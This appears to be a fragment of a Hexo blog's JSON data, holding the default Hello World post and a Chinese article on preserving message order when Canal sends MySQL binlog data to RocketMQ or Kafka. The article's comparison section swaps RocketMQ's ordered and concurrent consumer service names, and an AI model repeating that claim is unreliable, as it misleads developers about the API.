[GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"date":"2024-05-26T06:43:04.717Z","updated":"1985-10-26T08:15:00.000Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ry7000vbsuhgk5hczhj","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","cover":"/img/liushui.png","cover_type":"img","excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"canal配合MQ会有乱序的问题吗","date":"2024-07-14T03:55:29.000Z","_content":"\n\n\n如何实现消息有序？实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。\n\n在MQ模型中，顺序需由3个阶段去保障\n\n1.  顺序发送： 发送时保持顺序一致\n\n2.  顺序存储： broker 存储时保持 顺序一致\n\n3.  顺序消费： 消费时 保持 顺序一致\n\n\n![](./2024/07/14/canal配合MQ会有乱序的问题吗/1.png)\n\n2 消息有序的两大类型\n-----------\n\n有序消息，又叫顺序消息(FIFO消息)，指消息的消费顺序和产生顺序相同。\n\n如订单的生成、付款、发货，这串消息必须按序处理。\n\n顺序消息又可分为全局有序和局部有序：\n\n*   **全局有序**：整个MQ系统的所有消息严格按照队列先入先出顺序进行消费\n\n*   **局部有序**：只保证一部分关键信息的消费顺序\n\n\n### 2.1 全局顺序\n\n一个Topic内所有的消息都发布到同一Q，按FIFO顺序进行发布和消费：\n\n![](./2024/07/14/canal配合MQ会有乱序的问题吗/2.png)\n\n落地到RocketMQ，如何保证全局有序？\n\n为了 保证Topic全局消息有序的方式，就是将Topic配置成只有一个唯一的MessageQueue队列， 默认是4个MessageQueue。\n\nRocketMQ中，可以在发送者发送消息时指定一个MessageSelector对象，让这个对象来决定消息发入哪一个MessageQueue。这样就可以保证一组有序的消息能够发到同一个MessageQueue里。\n\n#### 适用场景\n\n性能要求不高，所有消息严格按照FIFO进行消息发布和消费的场景。\n\n### 2.2 分区顺序\n\n对于指定的一个Topic，所有消息按`sharding key`进行区块(queue)分区，同一Queue内的消息严格按FIFO发布和消费。\n\n*   Sharding key是顺序消息中用来区分不同分区的关键字段，和普通消息的Key完全不同。\n\n\n![](./2024/07/14/canal配合MQ会有乱序的问题吗/3.png)\n\n落地到RocketMQ。而MessageQueue是RocketMQ存储消息的最小单元，他们之间的消息都是互相隔离的，在这种情况下，是无法保证消息全局有序的，但是可以保证局部有序。\n\n默认的做法是，发送消息时，会通过MessageQueue轮询的方式保证消息尽量均匀分布到所有的MessageQueue上，而消费者也就同样需要从多个MessageQueue上消费消息。这就做不到局部有序。\n\n对于局部有序的要求，只需要将有序的一组消息都存入同一个MessageQueue里，这样MessageQueue的FIFO设计天生就可以保证这一组消息的有序。\n\n#### 适用场景\n\n性能要求高，根据消息中的sharding key去决定消息发送到哪个queue。\n\n其实大部分的MQ业务场景，我们只需要保证局部有序就可以了。\n\n例如\n\n*   我们用QQ聊天，只需要保证一个聊天窗口里的消息有序就可以了。\n\n*   而对于电商订单场景，也只要保证一个订单的所有消息是有序的就可以了。\n\n\n### 2.3 对比\n\n**发送方式对比**\n\n![](./2024/07/14/canal配合MQ会有乱序的问题吗/4.png)\n\n**存储方式对比**\n\n*   无\n\n\n**消费方式对比**\n\n*   有序消费的消费者类型：ConsumeMessageConcurrentlyService 并发消费服务\n\n*   无序消费的消费者类型：ConsumeMessageOrderlyService\n\n\n3 应用开发维度的实现消息有序需要做的工作：\n----------------------\n\n实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。 顺序存储环节，RocketMQ 里的分区队列 MessageQueue 本身是能保证 FIFO 的。\n\n所以，在应用开发过程中，不能顺序消费消息主要有两个原因：\n\n*   **顺序发送环节，消息发生没有序**：Producer 发送消息到 MessageQueue 时是轮询发送的，消息被发送到不同的分区队列，就不能保证 FIFO 了。\n\n*   **顺序消费环节，消息消费无序**：Consumer 默认是多线程并发消费同一个 MessageQueue 的，即使消息是顺序到达的，也不能保证消息顺序消费。\n\n\n我们知道了实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。\n\n顺序存储 由 Rocketmq 完成，所以，在应用开发层, 消息的顺序需要由两个阶段保证：\n\n*   消息发送有序\n\n*   消息消费有序\n\n\n![](./2024/07/14/canal配合MQ会有乱序的问题吗/5.png)\n\n4：canal+MQ，如何实现有序？\n------------------\n\nCanal 是阿里巴巴开源的一个增量订阅和消费的中间件，用于基于 MySQL 的数据库增量日志解析（Binlog）。通过 Canal，可以实现对数据库的实时监控和数据同步。\n\n我们在通过Canal把MySQL的Binlog数据发送到MQ(kafak/rocketmq)时，需要关注好几个环节：\n\n*   Cannal 的有序监听。 Binlog本身是有序的，写入到mq之后如何保障顺序\n\n*   Cannal 的有序发送。\n\n*   顺序存储： broker 存储时保持 顺序一致\n\n*   顺序消费： 消费时 保持 顺序一致\n\n\n### 4.1 Cannal 的有序发送\n\ncanal目前支持kafka和rocketmq，在使用 Canal 进行数据同步时，保证数据的有序性是一个重要的问题，尤其是在分布式环境中。在 Kafka 或 RocketMQ 等消息队列中，消息的顺序性和分区策略至关重要。\n\ncanal 本质上都是基于本地文件的方式来支持分区级别的顺序消息，也就是binlog写入mq是可以有一定的顺序性保障，这个保障级别取决于用户的两个配置项：\n\n*   `canal.mq.partitionsNum`\n\n*   `canal.mq.partitionHash`\n\n\n两个配置项 用于控制消息的分区和顺序。两个配置项介绍如下：\n\n1.  **canal.mq.partitionsNum**：\n\n\n*   **描述**：设置消息队列的分区数量。\n\n*   **作用**：决定了消息在消息队列中被分区的数量。不同的分区可以并行处理，但需要注意同一个分区内的消息是有序的。\n\n\n3.  **canal.mq.partitionHash**：\n\n\n*   **描述**：设置消息分区的哈希规则。\n\n*   **作用**：用于指定分区的哈希策略，可以根据特定的字段进行分区。例如，可以根据表名、主键等字段进行分区，以保证某些关键数据的有序性。\n\n\n### 4.2 Cannal 的有序发送示例\n\n假设我们希望将数据同步到 Kafka，并且需要保证某张表的数据是有序的，可以使用以下配置：\n\n```\n\n\ncanal.mq.partitionsNum=10  \ncanal.mq.partitionHash=my\\_database.my\\_table:id  \n\n\n\n```\n\n配置解释\n\n1.  **canal.mq.partitionsNum=10**：\n\n\n*   表示消息会被分成 10 个分区。每个分区可以并行处理，从而提高处理效率。\n\n\n3.  **canal.mq.partitionHash=my\\_database.my\\_table**\n\n\n*   针对 `my_database.my_table` 表的数据，根据 `id` 字段进行哈希分区。\n\n*   这样可以确保同一个 `id` 的所有变更都进入同一个分区，从而保证该 `id` 的变更顺序不变。\n\n\n通过配置 `canal.mq.partitionHash`，分区内的消息是有序的，因此只要保证同一实体（如同一行数据）的变更进入同一个分区，就能保证其有序性。\n\n### 4.3 Cannal 的使用场景\n\n*   **实时数据同步**：将数据库的变更实时同步到其他系统，如搜索引擎、缓存等。\n\n*   **数据备份**：实现数据库的实时备份，确保数据的一致性和完整性。\n\n*   **事件驱动架构**：在事件驱动架构中，利用 Canal 将数据库变更作为事件发布到消息队列，供其他系统消费。\n\n\n通过合理配置 `canal.mq.partitionsNum` 和 `canal.mq.partitionHash`，可以在数据同步中既保证有序性，又提高处理效率。\n伙20天时间提75W年薪offer，逆涨50%，秘诀在这](https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&mid=2247491496&idx=1&sn=cb31f7510a7c2efb7daf6cad793860ad&scene=21#wechat_redirect)","source":"_posts/canal配合MQ会有乱序的问题吗.md","raw":"---\ntitle: canal配合MQ会有乱序的问题吗\ndate: 2024-07-14 11:55:29\ntags: canal有序性\ncategories: 面试\n---\n\n\n\n如何实现消息有序？实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。\n\n在MQ模型中，顺序需由3个阶段去保障\n\n1.  顺序发送： 发送时保持顺序一致\n\n2.  顺序存储： broker 存储时保持 顺序一致\n\n3.  顺序消费： 消费时 保持 顺序一致\n\n\n![](./2024/07/14/canal配合MQ会有乱序的问题吗/1.png)\n\n2 消息有序的两大类型\n-----------\n\n有序消息，又叫顺序消息(FIFO消息)，指消息的消费顺序和产生顺序相同。\n\n如订单的生成、付款、发货，这串消息必须按序处理。\n\n顺序消息又可分为全局有序和局部有序：\n\n*   **全局有序**：整个MQ系统的所有消息严格按照队列先入先出顺序进行消费\n\n*   **局部有序**：只保证一部分关键信息的消费顺序\n\n\n### 2.1 全局顺序\n\n一个Topic内所有的消息都发布到同一Q，按FIFO顺序进行发布和消费：\n\n![](./2024/07/14/canal配合MQ会有乱序的问题吗/2.png)\n\n落地到RocketMQ，如何保证全局有序？\n\n为了 保证Topic全局消息有序的方式，就是将Topic配置成只有一个唯一的MessageQueue队列， 默认是4个MessageQueue。\n\nRocketMQ中，可以在发送者发送消息时指定一个MessageSelector对象，让这个对象来决定消息发入哪一个MessageQueue。这样就可以保证一组有序的消息能够发到同一个MessageQueue里。\n\n#### 适用场景\n\n性能要求不高，所有消息严格按照FIFO进行消息发布和消费的场景。\n\n### 2.2 分区顺序\n\n对于指定的一个Topic，所有消息按`sharding key`进行区块(queue)分区，同一Queue内的消息严格按FIFO发布和消费。\n\n*   Sharding key是顺序消息中用来区分不同分区的关键字段，和普通消息的Key完全不同。\n\n\n![](./2024/07/14/canal配合MQ会有乱序的问题吗/3.png)\n\n落地到RocketMQ。而MessageQueue是RocketMQ存储消息的最小单元，他们之间的消息都是互相隔离的，在这种情况下，是无法保证消息全局有序的，但是可以保证局部有序。\n\n默认的做法是，发送消息时，会通过MessageQueue轮询的方式保证消息尽量均匀分布到所有的MessageQueue上，而消费者也就同样需要从多个MessageQueue上消费消息。这就做不到局部有序。\n\n对于局部有序的要求，只需要将有序的一组消息都存入同一个MessageQueue里，这样MessageQueue的FIFO设计天生就可以保证这一组消息的有序。\n\n#### 适用场景\n\n性能要求高，根据消息中的sharding key去决定消息发送到哪个queue。\n\n其实大部分的MQ业务场景，我们只需要保证局部有序就可以了。\n\n例如\n\n*   我们用QQ聊天，只需要保证一个聊天窗口里的消息有序就可以了。\n\n*   而对于电商订单场景，也只要保证一个订单的所有消息是有序的就可以了。\n\n\n### 2.3 对比\n\n**发送方式对比**\n\n![](./2024/07/14/canal配合MQ会有乱序的问题吗/4.png)\n\n**存储方式对比**\n\n*   无\n\n\n**消费方式对比**\n\n*   有序消费的消费者类型：ConsumeMessageConcurrentlyService 并发消费服务\n\n*   无序消费的消费者类型：ConsumeMessageOrderlyService\n\n\n3 应用开发维度的实现消息有序需要做的工作：\n----------------------\n\n实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。 顺序存储环节，RocketMQ 里的分区队列 MessageQueue 本身是能保证 FIFO 的。\n\n所以，在应用开发过程中，不能顺序消费消息主要有两个原因：\n\n*   **顺序发送环节，消息发生没有序**：Producer 发送消息到 MessageQueue 时是轮询发送的，消息被发送到不同的分区队列，就不能保证 FIFO 了。\n\n*   **顺序消费环节，消息消费无序**：Consumer 默认是多线程并发消费同一个 MessageQueue 的，即使消息是顺序到达的，也不能保证消息顺序消费。\n\n\n我们知道了实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。\n\n顺序存储 由 Rocketmq 完成，所以，在应用开发层, 消息的顺序需要由两个阶段保证：\n\n*   消息发送有序\n\n*   消息消费有序\n\n\n![](./2024/07/14/canal配合MQ会有乱序的问题吗/5.png)\n\n4：canal+MQ，如何实现有序？\n------------------\n\nCanal 是阿里巴巴开源的一个增量订阅和消费的中间件，用于基于 MySQL 的数据库增量日志解析（Binlog）。通过 Canal，可以实现对数据库的实时监控和数据同步。\n\n我们在通过Canal把MySQL的Binlog数据发送到MQ(kafak/rocketmq)时，需要关注好几个环节：\n\n*   Cannal 的有序监听。 Binlog本身是有序的，写入到mq之后如何保障顺序\n\n*   Cannal 的有序发送。\n\n*   顺序存储： broker 存储时保持 顺序一致\n\n*   顺序消费： 消费时 保持 顺序一致\n\n\n### 4.1 Cannal 的有序发送\n\ncanal目前支持kafka和rocketmq，在使用 Canal 进行数据同步时，保证数据的有序性是一个重要的问题，尤其是在分布式环境中。在 Kafka 或 RocketMQ 等消息队列中，消息的顺序性和分区策略至关重要。\n\ncanal 本质上都是基于本地文件的方式来支持分区级别的顺序消息，也就是binlog写入mq是可以有一定的顺序性保障，这个保障级别取决于用户的两个配置项：\n\n*   `canal.mq.partitionsNum`\n\n*   `canal.mq.partitionHash`\n\n\n两个配置项 用于控制消息的分区和顺序。两个配置项介绍如下：\n\n1.  **canal.mq.partitionsNum**：\n\n\n*   **描述**：设置消息队列的分区数量。\n\n*   **作用**：决定了消息在消息队列中被分区的数量。不同的分区可以并行处理，但需要注意同一个分区内的消息是有序的。\n\n\n3.  **canal.mq.partitionHash**：\n\n\n*   **描述**：设置消息分区的哈希规则。\n\n*   **作用**：用于指定分区的哈希策略，可以根据特定的字段进行分区。例如，可以根据表名、主键等字段进行分区，以保证某些关键数据的有序性。\n\n\n### 4.2 Cannal 的有序发送示例\n\n假设我们希望将数据同步到 Kafka，并且需要保证某张表的数据是有序的，可以使用以下配置：\n\n```\n\n\ncanal.mq.partitionsNum=10  \ncanal.mq.partitionHash=my\\_database.my\\_table:id  \n\n\n\n```\n\n配置解释\n\n1.  **canal.mq.partitionsNum=10**：\n\n\n*   表示消息会被分成 10 个分区。每个分区可以并行处理，从而提高处理效率。\n\n\n3.  **canal.mq.partitionHash=my\\_database.my\\_table**\n\n\n*   针对 `my_database.my_table` 表的数据，根据 `id` 字段进行哈希分区。\n\n*   这样可以确保同一个 `id` 的所有变更都进入同一个分区，从而保证该 `id` 的变更顺序不变。\n\n\n通过配置 `canal.mq.partitionHash`，分区内的消息是有序的，因此只要保证同一实体（如同一行数据）的变更进入同一个分区，就能保证其有序性。\n\n### 4.3 Cannal 的使用场景\n\n*   **实时数据同步**：将数据库的变更实时同步到其他系统，如搜索引擎、缓存等。\n\n*   **数据备份**：实现数据库的实时备份，确保数据的一致性和完整性。\n\n*   **事件驱动架构**：在事件驱动架构中，利用 Canal 将数据库变更作为事件发布到消息队列，供其他系统消费。\n\n\n通过合理配置 `canal.mq.partitionsNum` 和 `canal.mq.partitionHash`，可以在数据同步中既保证有序性，又提高处理效率。\n伙20天时间提75W年薪offer，逆涨50%，秘诀在这](https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&mid=2247491496&idx=1&sn=cb31f7510a7c2efb7daf6cad793860ad&scene=21#wechat_redirect)","slug":"canal配合MQ会有乱序的问题吗","published":1,"updated":"2024-07-14T04:00:27.805Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ry9000ybsuhcy6ndk2u","content":"<p>如何实现消息有序？实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。</p>\n<p>在MQ模型中，顺序需由3个阶段去保障</p>\n<ol>\n<li><p>顺序发送： 发送时保持顺序一致</p>\n</li>\n<li><p>顺序存储： broker 存储时保持 顺序一致</p>\n</li>\n<li><p>顺序消费： 消费时 保持 顺序一致</p>\n</li>\n</ol>\n<p><img src=\"/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/1.png\"></p>\n<h2 id=\"2-消息有序的两大类型\"><a href=\"#2-消息有序的两大类型\" class=\"headerlink\" title=\"2 消息有序的两大类型\"></a>2 消息有序的两大类型</h2><p>有序消息，又叫顺序消息(FIFO消息)，指消息的消费顺序和产生顺序相同。</p>\n<p>如订单的生成、付款、发货，这串消息必须按序处理。</p>\n<p>顺序消息又可分为全局有序和局部有序：</p>\n<ul>\n<li><p><strong>全局有序</strong>：整个MQ系统的所有消息严格按照队列先入先出顺序进行消费</p>\n</li>\n<li><p><strong>局部有序</strong>：只保证一部分关键信息的消费顺序</p>\n</li>\n</ul>\n<h3 id=\"2-1-全局顺序\"><a href=\"#2-1-全局顺序\" class=\"headerlink\" title=\"2.1 全局顺序\"></a>2.1 全局顺序</h3><p>一个Topic内所有的消息都发布到同一Q，按FIFO顺序进行发布和消费：</p>\n<p><img src=\"/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/2.png\"></p>\n<p>落地到RocketMQ，如何保证全局有序？</p>\n<p>为了 保证Topic全局消息有序的方式，就是将Topic配置成只有一个唯一的MessageQueue队列， 默认是4个MessageQueue。</p>\n<p>RocketMQ中，可以在发送者发送消息时指定一个MessageSelector对象，让这个对象来决定消息发入哪一个MessageQueue。这样就可以保证一组有序的消息能够发到同一个MessageQueue里。</p>\n<h4 id=\"适用场景\"><a href=\"#适用场景\" class=\"headerlink\" title=\"适用场景\"></a>适用场景</h4><p>性能要求不高，所有消息严格按照FIFO进行消息发布和消费的场景。</p>\n<h3 id=\"2-2-分区顺序\"><a href=\"#2-2-分区顺序\" class=\"headerlink\" title=\"2.2 分区顺序\"></a>2.2 分区顺序</h3><p>对于指定的一个Topic，所有消息按<code>sharding key</code>进行区块(queue)分区，同一Queue内的消息严格按FIFO发布和消费。</p>\n<ul>\n<li>Sharding key是顺序消息中用来区分不同分区的关键字段，和普通消息的Key完全不同。</li>\n</ul>\n<p><img src=\"/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/3.png\"></p>\n<p>落地到RocketMQ。而MessageQueue是RocketMQ存储消息的最小单元，他们之间的消息都是互相隔离的，在这种情况下，是无法保证消息全局有序的，但是可以保证局部有序。</p>\n<p>默认的做法是，发送消息时，会通过MessageQueue轮询的方式保证消息尽量均匀分布到所有的MessageQueue上，而消费者也就同样需要从多个MessageQueue上消费消息。这就做不到局部有序。</p>\n<p>对于局部有序的要求，只需要将有序的一组消息都存入同一个MessageQueue里，这样MessageQueue的FIFO设计天生就可以保证这一组消息的有序。</p>\n<h4 id=\"适用场景-1\"><a href=\"#适用场景-1\" class=\"headerlink\" title=\"适用场景\"></a>适用场景</h4><p>性能要求高，根据消息中的sharding key去决定消息发送到哪个queue。</p>\n<p>其实大部分的MQ业务场景，我们只需要保证局部有序就可以了。</p>\n<p>例如</p>\n<ul>\n<li><p>我们用QQ聊天，只需要保证一个聊天窗口里的消息有序就可以了。</p>\n</li>\n<li><p>而对于电商订单场景，也只要保证一个订单的所有消息是有序的就可以了。</p>\n</li>\n</ul>\n<h3 id=\"2-3-对比\"><a href=\"#2-3-对比\" class=\"headerlink\" title=\"2.3 对比\"></a>2.3 对比</h3><p><strong>发送方式对比</strong></p>\n<p><img src=\"/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/4.png\"></p>\n<p><strong>存储方式对比</strong></p>\n<ul>\n<li>无</li>\n</ul>\n<p><strong>消费方式对比</strong></p>\n<ul>\n<li><p>有序消费的消费者类型：ConsumeMessageConcurrentlyService 并发消费服务</p>\n</li>\n<li><p>无序消费的消费者类型：ConsumeMessageOrderlyService</p>\n</li>\n</ul>\n<h2 id=\"3-应用开发维度的实现消息有序需要做的工作：\"><a href=\"#3-应用开发维度的实现消息有序需要做的工作：\" class=\"headerlink\" title=\"3 应用开发维度的实现消息有序需要做的工作：\"></a>3 应用开发维度的实现消息有序需要做的工作：</h2><p>实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。 顺序存储环节，RocketMQ 里的分区队列 MessageQueue 本身是能保证 FIFO 的。</p>\n<p>所以，在应用开发过程中，不能顺序消费消息主要有两个原因：</p>\n<ul>\n<li><p><strong>顺序发送环节，消息发生没有序</strong>：Producer 发送消息到 MessageQueue 时是轮询发送的，消息被发送到不同的分区队列，就不能保证 FIFO 了。</p>\n</li>\n<li><p><strong>顺序消费环节，消息消费无序</strong>：Consumer 默认是多线程并发消费同一个 MessageQueue 的，即使消息是顺序到达的，也不能保证消息顺序消费。</p>\n</li>\n</ul>\n<p>我们知道了实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。</p>\n<p>顺序存储 由 Rocketmq 完成，所以，在应用开发层, 消息的顺序需要由两个阶段保证：</p>\n<ul>\n<li><p>消息发送有序</p>\n</li>\n<li><p>消息消费有序</p>\n</li>\n</ul>\n<p><img src=\"/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/5.png\"></p>\n<h2 id=\"4：canal-MQ，如何实现有序？\"><a href=\"#4：canal-MQ，如何实现有序？\" class=\"headerlink\" title=\"4：canal+MQ，如何实现有序？\"></a>4：canal+MQ，如何实现有序？</h2><p>Canal 是阿里巴巴开源的一个增量订阅和消费的中间件，用于基于 MySQL 的数据库增量日志解析（Binlog）。通过 Canal，可以实现对数据库的实时监控和数据同步。</p>\n<p>我们在通过Canal把MySQL的Binlog数据发送到MQ(kafak&#x2F;rocketmq)时，需要关注好几个环节：</p>\n<ul>\n<li><p>Cannal 的有序监听。 Binlog本身是有序的，写入到mq之后如何保障顺序</p>\n</li>\n<li><p>Cannal 的有序发送。</p>\n</li>\n<li><p>顺序存储： broker 存储时保持 顺序一致</p>\n</li>\n<li><p>顺序消费： 消费时 保持 顺序一致</p>\n</li>\n</ul>\n<h3 id=\"4-1-Cannal-的有序发送\"><a href=\"#4-1-Cannal-的有序发送\" class=\"headerlink\" title=\"4.1 Cannal 的有序发送\"></a>4.1 Cannal 的有序发送</h3><p>canal目前支持kafka和rocketmq，在使用 Canal 进行数据同步时，保证数据的有序性是一个重要的问题，尤其是在分布式环境中。在 Kafka 或 RocketMQ 等消息队列中，消息的顺序性和分区策略至关重要。</p>\n<p>canal 本质上都是基于本地文件的方式来支持分区级别的顺序消息，也就是binlog写入mq是可以有一定的顺序性保障，这个保障级别取决于用户的两个配置项：</p>\n<ul>\n<li><p><code>canal.mq.partitionsNum</code></p>\n</li>\n<li><p><code>canal.mq.partitionHash</code></p>\n</li>\n</ul>\n<p>两个配置项 用于控制消息的分区和顺序。两个配置项介绍如下：</p>\n<ol>\n<li><strong>canal.mq.partitionsNum</strong>：</li>\n</ol>\n<ul>\n<li><p><strong>描述</strong>：设置消息队列的分区数量。</p>\n</li>\n<li><p><strong>作用</strong>：决定了消息在消息队列中被分区的数量。不同的分区可以并行处理，但需要注意同一个分区内的消息是有序的。</p>\n</li>\n</ul>\n<ol start=\"3\">\n<li><strong>canal.mq.partitionHash</strong>：</li>\n</ol>\n<ul>\n<li><p><strong>描述</strong>：设置消息分区的哈希规则。</p>\n</li>\n<li><p><strong>作用</strong>：用于指定分区的哈希策略，可以根据特定的字段进行分区。例如，可以根据表名、主键等字段进行分区，以保证某些关键数据的有序性。</p>\n</li>\n</ul>\n<h3 id=\"4-2-Cannal-的有序发送示例\"><a href=\"#4-2-Cannal-的有序发送示例\" class=\"headerlink\" title=\"4.2 Cannal 的有序发送示例\"></a>4.2 Cannal 的有序发送示例</h3><p>假设我们希望将数据同步到 Kafka，并且需要保证某张表的数据是有序的，可以使用以下配置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">canal.mq.partitionsNum=10  </span><br><span class=\"line\">canal.mq.partitionHash=my\\_database.my\\_table:id  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>配置解释</p>\n<ol>\n<li><strong>canal.mq.partitionsNum&#x3D;10</strong>：</li>\n</ol>\n<ul>\n<li>表示消息会被分成 10 个分区。每个分区可以并行处理，从而提高处理效率。</li>\n</ul>\n<ol start=\"3\">\n<li><strong>canal.mq.partitionHash&#x3D;my_database.my_table</strong></li>\n</ol>\n<ul>\n<li><p>针对 <code>my_database.my_table</code> 表的数据，根据 <code>id</code> 字段进行哈希分区。</p>\n</li>\n<li><p>这样可以确保同一个 <code>id</code> 的所有变更都进入同一个分区，从而保证该 <code>id</code> 的变更顺序不变。</p>\n</li>\n</ul>\n<p>通过配置 <code>canal.mq.partitionHash</code>，分区内的消息是有序的，因此只要保证同一实体（如同一行数据）的变更进入同一个分区，就能保证其有序性。</p>\n<h3 id=\"4-3-Cannal-的使用场景\"><a href=\"#4-3-Cannal-的使用场景\" class=\"headerlink\" title=\"4.3 Cannal 的使用场景\"></a>4.3 Cannal 的使用场景</h3><ul>\n<li><p><strong>实时数据同步</strong>：将数据库的变更实时同步到其他系统，如搜索引擎、缓存等。</p>\n</li>\n<li><p><strong>数据备份</strong>：实现数据库的实时备份，确保数据的一致性和完整性。</p>\n</li>\n<li><p><strong>事件驱动架构</strong>：在事件驱动架构中，利用 Canal 将数据库变更作为事件发布到消息队列，供其他系统消费。</p>\n</li>\n</ul>\n<p>通过合理配置 <code>canal.mq.partitionsNum</code> 和 <code>canal.mq.partitionHash</code>，可以在数据同步中既保证有序性，又提高处理效率。<br>伙20天时间提75W年薪offer，逆涨50%，秘诀在这](<a 